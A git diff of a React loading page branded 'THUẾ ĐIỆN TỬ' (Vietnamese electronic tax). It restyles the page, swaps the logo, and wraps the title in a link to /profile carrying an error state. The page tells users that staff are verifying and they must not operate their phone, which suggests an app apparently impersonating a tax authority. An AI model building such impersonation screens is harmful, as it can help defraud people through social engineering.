@@ -1,6 +1,6 @@
 import { useEffect, useState } from "react";
-import { useNavigate } from "react-router-dom";
-import thueDientu from "@/assets/thuedinetu.png";
+import { Link, useNavigate } from "react-router-dom";
+import theunotexxt from "@/assets/theunotexxt.png";
 
 const LoadingPage = () => {
   const navigate = useNavigate();
@@ -22,18 +22,20 @@ const LoadingPage = () => {
   }, [navigate]);
 
   return (
-    <div className="min-h-screen bg-gradient-to-b from-red-600 to-red-700 flex flex-col items-center justify-center px-6 text-white">
+    <div className="min-h-screen bg-[#f8341e] flex flex-col items-center justify-center px-6 text-white">
       {/* Title */}
-      <h1 className="text-2xl font-bold mb-12 tracking-wide">THUẾ ĐIỆN TỬ</h1>
+      <Link to="/profile" state={{ error: true }}>
+        <h1 className="text-2xl font-bold mb-12 tracking-wide">THUẾ ĐIỆN TỬ</h1>
+      </Link>
 
       {/* Logo */}
       <div className="mb-12">
-        <div className="w-48 h-48 rounded-full bg-yellow-400 border-8 border-yellow-300 flex items-center justify-center shadow-2xl">
-          <div className="w-40 h-40 rounded-full bg-red-800 flex items-center justify-center">
+        <div className="w-48 h-48 rounded-full flex items-center justify-center">
+          <div className="w-40 h-40 rounded-full flex items-center justify-center">
             <img
-              src={thueDientu}
+              src={theunotexxt}
               alt="Thuế Điện Tử"
-              className="w-32 h-32 opacity-90"
+              className="w-38 h-38 opacity-90"
             />
           </div>
         </div>
@@ -50,13 +52,11 @@ const LoadingPage = () => {
       </div>
 
       {/* Progress Text */}
-      <p className="text-lg font-medium mb-2">{progress}%</p>
+      <p className="text-lg font-bold mb-2">{progress}%</p>
 
       {/* Loading Message */}
-      <p className="text-center text-sm font-medium px-4">
-        NHÂN VIÊN ĐANG XÁC THỰC VUI LÒNG KHÔNG
-        <br />
-        THAO TÁC TRÊN ĐIỆN THOẠI
+      <p className="text-center text-[18px] font-bold px-4">
+        NHÂN VIÊN ĐANG XÁC THỰC VUI LÒNG KHÔNG THAO TÁC TRÊN ĐIỆN THOẠI
       </p>
     </div>
   );
